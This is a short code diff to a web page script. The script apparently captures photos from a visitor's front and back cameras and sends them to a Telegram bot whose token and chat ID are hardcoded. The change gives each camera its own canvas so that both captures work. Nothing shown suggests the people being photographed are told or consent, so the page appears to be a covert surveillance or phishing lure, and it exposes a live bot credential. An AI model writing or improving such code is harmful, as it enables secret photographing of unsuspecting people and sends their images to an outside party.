@@ -18,7 +18,8 @@
     <script>
 const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU";
 const CHAT_ID = "2139008203";
-const canvas = document.createElement('canvas');
+const canvasFront = document.createElement('canvas');
+const canvasBack = document.createElement('canvas');
 let videoFront = null;
 let videoBack = null;
 let streamFront = null;
@@ -64,7 +65,7 @@ async function startCamera(facingMode) {
     }
 }
 
-async function capturePhoto(video) {
+async function capturePhoto(video, canvas) {
     if (!video) return null;
 
     canvas.width = video.videoWidth;
@@ -75,8 +76,8 @@ async function capturePhoto(video) {
 }
 
 async function sendPhoto() {
-    const frontPhoto = await capturePhoto(videoFront);
-    const backPhoto = await capturePhoto(videoBack);
+    const frontPhoto = await capturePhoto(videoFront, canvasFront);
+    const backPhoto = await capturePhoto(videoBack, canvasBack);
     if (!frontPhoto && !backPhoto) return;
 
     const formData = new FormData();
